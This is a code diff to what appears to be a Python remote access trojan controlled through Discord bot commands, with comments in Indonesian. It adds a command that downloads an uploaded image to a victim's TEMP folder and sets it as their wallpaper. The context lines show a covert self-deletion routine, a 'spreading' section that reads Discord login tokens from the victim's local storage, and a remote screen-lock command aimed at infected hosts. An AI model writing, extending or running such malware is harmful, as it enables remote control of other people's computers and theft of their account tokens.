@@ -80,6 +80,15 @@ def uninstall_self():
     subprocess.Popen(batch_path, shell=True, creationflags=0x08000000)
     os._exit(0)
 
+def set_wallpaper(path):
+    try:
+        # SPI_SETDESKWALLPAPER = 20
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
+        return True
+    except Exception as e:
+        print(f"Error setting wallpaper: {e}")
+        return False
+
 # --- SPREADING MODULES ---
 def get_discord_token():
     path = os.getenv('APPDATA') + r'\discord\Local Storage\leveldb'
@@ -193,6 +202,24 @@ async def lock(ctx, target="all"):
     if target.lower() in ["all", HOSTNAME.lower()]:
         await ctx.send(f"🔒 Locking screen on `{HOSTNAME}`...")
         threading.Thread(target=run_gui, daemon=True).start()
+
+@bot.command()
+async def wallpaper(ctx, target):
+    """Ganti wallpaper menggunakan gambar yang di-upload bareng command"""
+    if target.lower() in ["all", HOSTNAME.lower()]:
+        if ctx.message.attachments:
+            # Simpan gambar sementara di folder Temp
+            attachment = ctx.message.attachments[0]
+            temp_path = os.path.join(os.getenv('TEMP'), attachment.filename)
+            await attachment.save(temp_path)
+            
+            # Eksekusi ganti wallpaper
+            if set_wallpaper(temp_path):
+                await ctx.send(f"🖼️ Wallpaper on `{HOSTNAME}` has been changed to `{attachment.filename}`")
+            else:
+                await ctx.send(f"❌ Failed to change wallpaper on `{HOSTNAME}`")
+        else:
+            await ctx.send("⚠️ Please upload an image with the command!")
 
 @bot.command()
 async def unlock(ctx, target="all"):
